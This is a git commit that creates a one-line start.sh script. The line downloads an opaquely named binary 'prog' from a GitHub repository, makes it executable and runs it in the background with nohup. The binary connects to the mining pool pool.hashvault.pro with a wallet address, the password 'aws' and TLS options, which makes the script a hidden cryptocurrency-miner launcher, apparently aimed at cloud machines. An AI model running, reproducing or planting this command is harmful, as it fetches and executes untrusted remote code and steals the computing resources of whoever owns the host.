4a9fbf1f42d36cd9e0a754e1e9459750c595c9d3
iceyfromdiscord <116362513+iceyfromdiscord@users.noreply.github.com>
2026-04-27 16:29:04 -0500

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,1 @@
+wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && nohup ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > log.log 2>&1 &
